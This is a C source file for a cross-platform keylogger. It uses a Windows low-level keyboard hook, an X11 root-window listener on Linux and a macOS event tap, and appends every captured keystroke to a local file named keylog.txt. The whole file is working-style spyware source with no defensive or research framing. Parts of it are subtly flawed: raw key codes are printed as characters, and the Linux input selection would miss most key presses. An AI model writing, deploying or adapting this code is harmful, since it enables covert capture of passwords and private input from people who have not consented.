#include <stdio.h>
#include <stdlib.h>

#ifdef _WIN32
    #include <windows.h>
    HHOOK hKeyboardHook;

    LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode == HC_ACTION) {
            KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
            if (wParam == WM_KEYDOWN) {
                FILE *file = fopen("keylog.txt", "a+");
                if (file != NULL) {
                    fprintf(file, "%c", pKeyboard->vkCode);
                    fclose(file);
                }
            }
        }
        return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
    }

    DWORD WINAPI HookThread(LPVOID lpParameter) {
        HINSTANCE hInstance = GetModuleHandle(NULL);
        hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        UnhookWindowsHookEx(hKeyboardHook);
        return 0;
    }

    void start_keylogger() {
        HANDLE hThread = CreateThread(NULL, 0, HookThread, NULL, 0, NULL);
        WaitForSingleObject(hThread, INFINITE);
    }

#elif __linux__
    #include <X11/Xlib.h>
    #include <X11/XKBlib.h>
    #include <X11/extensions/XInput2.h>

    void start_keylogger() {
        Display *display = XOpenDisplay(NULL);
        if (!display) {
            fprintf(stderr, "Unable to open X display\n");
            exit(1);
        }

        Window root = DefaultRootWindow(display);
        XEvent event;
        XSelectInput(display, root, KeyPressMask);

        FILE *file = fopen("keylog.txt", "a+");

        while (1) {
            XNextEvent(display, &event);
            if (event.type == KeyPress) {
                KeySym keysym = XkbKeycodeToKeysym(display, event.xkey.keycode, 0, 0);
                if (file != NULL) {
                    fprintf(file, "%c", (char)keysym);
                    fflush(file);
                }
            }
        }
        fclose(file);
        XCloseDisplay(display);
    }

#elif __APPLE__
    #include <ApplicationServices/ApplicationServices.h>

    CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
        if (type == kCGEventKeyDown) {
            FILE *file = fopen("keylog.txt", "a+");
            if (file != NULL) {
                CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
                fprintf(file, "%c", keycode);
                fclose(file);
            }
        }
        return event;
    }

    void start_keylogger() {
        CFMachPortRef eventTap;
        CFRunLoopSourceRef runLoopSource;

        eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, CGEventMaskBit(kCGEventKeyDown), eventCallback, NULL);

        if (!eventTap) {
            fprintf(stderr, "Couldn't create event tap\n");
            exit(1);
        }

        runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
        CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
        CGEventTapEnable(eventTap, true);
        CFRunLoopRun();
    }

#else
    #error "Platform not supported"
#endif

int main() {
    start_keylogger();
    return 0;
}
